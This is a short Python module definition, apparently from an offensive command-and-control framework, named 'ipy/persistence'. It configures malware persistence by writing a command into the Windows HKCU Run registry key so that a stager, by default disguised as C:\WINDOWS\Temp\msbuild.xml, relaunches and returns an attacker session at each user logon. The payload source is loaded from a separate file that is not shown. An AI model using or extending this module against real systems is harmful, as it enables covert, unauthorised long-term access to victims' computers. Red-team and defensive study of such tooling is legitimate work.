class STModule:
    def __init__(self):
        self.name = 'ipy/persistence'
        self.language = 'ipy'
        self.description = 'Set a new command in HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run registry key to launch the stager and get a session each time the user connects'
        self.author = '@maximemf'
        self.options = {
            'Path': {
                'Description'   :   'Path to the stager file',
                'Required'      :   False,
                'Value'         :   "C:\\\\WINDOWS\\\\Temp\\\\msbuild.xml"
            }
        }

    def payload(self):
        with open('modules/ipy/src/persistence.py', 'r') as module_src:
            src = module_src.read()
            src = src.replace('PATH', self.options['Path']['Value'])
            return src
